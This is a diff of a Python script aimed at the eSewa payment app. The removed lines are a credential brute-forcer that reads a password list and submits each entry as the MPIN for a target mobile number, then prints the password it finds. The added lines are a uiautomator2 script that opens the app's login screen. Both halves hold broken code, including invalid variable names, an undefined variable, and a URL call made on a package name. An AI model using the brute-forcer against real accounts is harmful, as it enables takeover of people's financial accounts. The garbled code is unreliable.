@@ -1,63 +1,25 @@
-import time
-import sys
-import subprocess
+import uiautomator2 as u2
 
-if sys.version_info[0] != 3:
-    print('''--------------------------------------
-    REQUIRED PYTHON 3.x
-    use: python fp2.py
---------------------------------------
-        ''')
-    sys.exit()
+# connect the device
+d = u2.connect()
 
-package_name = "com.f1soft.esewa"
-command = ["am", "start", "-n", package_name + "/.MainActivity"]
-completed_process = subprocess.run(command, check=True)
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
-}
+# Launch the app (e.g., Twitter)
+d.app_start("com.esewa.android")
 
-try:
-    import mechanize
-except ImportError:
-    print('\nPlease install mechanize.\n')
-    sys.exit()
+# Wait for the app to load
+d.wait_activity("com.esewa.android.app.main.MainActivity", timeout=20)
 
-browser = mechanize.Browser()
-browser.addheaders = [('User-Agent', headers['User-Agent'])]
-browser.set_handle_robots(False)
+# Perform automated actions
+# Example: Click on the search button
+d(resourceId="com.esewa.android:id/toolbar_login/register").click()
 
-print('\n----------Welcome|VICKY----------\n')
-file = open('passwords.txt', 'r')
+# Wait for some time to allow for manual interaction
+input("Perform manual actions and press Enter when ready...")
 
-MobileNumber = input('Mobile Number : ').strip()
+# Continue with automated actions
+# Example: Enter a search query
+Mobile Number_box = d(resourceId="com.esewa.android:id/toolbar_login/register_edittext")
+search_box.set_text("OpenAI")
 
-print("\nTarget Mobile Number : ", MobileNumber)
-print("\nTrying Passwords from list ...")
-
-i = 0
-while True:
-    passw = file.readline().strip()
-    i += 1
-    if len(passw) < 4:
-        continue
-    print(str(i) + " : " + passw)
-    response = browser.open(package_name)
-    try:
-        if response.code == 200:
-            browser.select_form(nr=0)
-            browser.form['Mobile Number'] = MobileNumber
-            browser.form['MPIN'] = passw
-            response = browser.submit()
-            response_data = response.read()
-            print(response_data.decode('utf-8'))
-            print('Your password is : ', passw)
-
-    except Exception as e:
-        print('\nSleeping for time : 0 min\n')
-        time.sleep(0)
-
-    if not passw:
-        break
-
-file.close()
+# Close the app
+d.app_stop("com.esewa.android")
